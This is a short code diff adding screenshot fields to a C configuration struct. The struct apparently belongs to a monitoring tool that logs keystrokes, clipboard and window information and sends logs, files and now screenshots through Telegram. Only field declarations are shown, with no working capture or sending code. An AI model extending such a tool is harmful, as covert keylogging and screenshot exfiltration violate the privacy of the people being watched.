@@ -33,6 +33,8 @@ typedef struct {
   int telegram_send_window_info;
   int telegram_send_logs;
   size_t telegram_log_interval_sec;
+  int telegram_send_screenshots;
+  size_t telegram_screenshot_interval_sec;
   size_t telegram_max_file_bytes;
   size_t queue_max_bytes;
   size_t queue_max_items;
@@ -40,6 +42,7 @@ typedef struct {
   size_t retry_delay_ms;
   int disable_keyboard;
   int disable_clipboard;
+  int disable_screenshot;
   size_t keyboard_flush_ms;
   int keyboard_shortcuts;
   const char *keyboard_layout;
